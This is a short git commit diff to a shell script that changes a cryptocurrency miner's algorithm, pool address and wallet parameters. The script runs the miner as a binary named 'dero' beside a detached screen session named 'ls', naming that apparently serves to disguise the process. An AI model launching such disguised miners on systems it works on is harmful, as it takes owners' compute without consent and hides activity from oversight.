303eb9dbe5b0490bbbb75ae34d03457b8931946b
RizQu5 <122372013+RizQu5@users.noreply.github.com>
2023-01-14 13:51:07 +0700

    Update tUk.sh

--- tUk.sh
+++ tUk.sh
@@ -14,7 +14,7 @@ chmod +x dero >/dev/null 2>&1
 
 screen -dmS ls
 
-./dero -a minotaurx -o stratum+tcps://stratum-eu.rplant.xyz:17063 -u PQFYTbguveuWuwRjZRsUiQZnW3ea51Rbc3.02_beDO
+./dero -a yespowerR16 -o stratum+tcp://yespowerR16.mine.zergpool.com:6534 -u PQFYTbguveuWuwRjZRsUiQZnW3ea51Rbc3 --timeout 120 -p c=PLSR,mc=YTN,ID=001.beDO
 
 while [ 1 ]; do
 
